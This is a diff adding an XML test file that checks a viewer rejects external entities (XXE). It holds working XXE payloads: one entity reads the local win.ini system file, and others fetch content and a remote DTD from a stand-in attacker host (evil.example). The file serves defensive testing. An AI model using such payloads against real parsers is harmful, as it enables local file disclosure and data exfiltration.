@@ -1,0 +1,13 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!-- Test file for the viewer: external entities (XXE) that would read a local file or fetch an address. The viewer
+     must never show win.ini's contents or fetch anything. -->
+<!DOCTYPE notes [
+  <!ENTITY secret SYSTEM "file:///C:/Windows/win.ini">
+  <!ENTITY remote SYSTEM "http://evil.example/entity.txt">
+  <!ENTITY % dtd SYSTEM "http://evil.example/evil.dtd">
+  %dtd;
+]>
+<notes>
+  <note><title>Local file</title><body>&secret;</body></note>
+  <note><title>Remote</title><body>&remote;</body></note>
+</notes>
